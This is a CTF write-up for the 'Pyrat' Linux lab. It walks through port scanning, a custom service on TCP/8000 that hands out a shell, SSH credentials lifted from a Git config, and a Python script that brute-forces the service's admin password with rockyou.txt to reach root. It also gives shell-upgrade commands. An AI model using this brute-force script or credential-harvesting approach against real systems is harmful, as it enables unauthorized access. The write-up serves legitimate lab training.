---
title: Pyrat
difficulty: Easy
environment: Linux
tags:
  - Python
  - Git
  - SSH
  - Brute Force
  - Linux
image: "https://cards.scryfall.io/art_crop/front/4/6/46419d29-21a1-4753-a2f0-1d0d996ec54e.jpg?1608910463"
image_alt: "Soul Shatter art"
date: 2026-02-10
---

## Overview

Pyrat is an easy Linux CTF centered around a custom **PyRAT** service exposed on TCP/8000. The path to root is straightforward: get a shell as `www-data`, recover SSH creds for user `think` from a Git config, then brute-force the PyRAT `admin` password to pop a root shell.

## Reconnaissance

### Nmap Scan

```
$ nmap -p- --min-rate 1000 -Pn 10.10.10.10
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

```
$ nmap -sCV -p 22,8000 -oN nmap/pyrat 10.10.10.10
```

Port 8000 is not a normal web service; interacting with it manually (e.g., via `nc`) reveals a custom text-based program.

## Exploitation

### Initial Access

Connect to the service with netcat:

```bash
nc -nv 10.10.10.10 8000
```

From here you can either:

- simply type `shell` (this spawns a shell directly), or
- paste a standard reverse shell payload (I used a payload from PayloadsAllTheThings' reverse-shell cheatsheet).

This yields an initial shell as `www-data`.

### Lateral Movement

During local enumeration from the initial shell, I found a Git config file exposing credentials for another user:

```
$ cat /opt/dev/.git/config
```

Those credentials can then be used for SSH access (cleaner interactive session) and to continue enumeration as that user.

```bash
ssh think@10.10.10.10
```

User flag:

- `996dbb1f619a68361417cabca545XXXX`

### Privilege Escalation
Back on TCP/8000, the service has an `admin` mode protected by a password. I fuzzed/brute-forced it using `rockyou.txt` until it accepted a value.

Script used:

```python
import socket


IP, PORT = "10.10.10.10", 8000
WORDLIST = "/usr/share/wordlists/rockyou.txt"


def try_password(password: str) -> bool:
  with socket.create_connection((IP, PORT), timeout=3) as sock:
    sock.recv(4096)  # banner
    sock.sendall(b"admin\n")
    prompt = sock.recv(4096).decode(errors="ignore")
    if "Password" not in prompt:
      return False
    sock.sendall((password + "\n").encode())
    resp = sock.recv(4096).decode(errors="ignore")
    return ("Welcome" in resp) or ("Admin" in resp)


with open(WORDLIST, encoding="latin1") as f:
  for pw in map(str.strip, f):
    if not pw:
      continue
    try:
      if try_password(pw):
        print(f"[+] Admin password: {pw}")
        break
    except OSError:
      pass
```

The correct password was:

- `abc123`

Upon successful authentication, the service spawns a shell as `root`.

Root flag:

- `ba5ed03e9e74bb98054438480165XXXX`

## Flags

- **User:** `996dbb1f619a68361417cabca545XXXX`
- **Root:** `ba5ed03e9e74bb98054438480165XXXX`

## Lessons Learned

This box reinforces a few evergreen themes: custom services deserve the same scrutiny as "real" daemons, credentials in repo config files are an easy win for attackers, and brute forcing becomes trivial when there are no rate limits.

## Notes

Shell upgrading flow:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Ctrl+Z to background the session:

```bash
stty raw -echo; fg
```

Set `TERM`:

```bash
export TERM=xterm
```
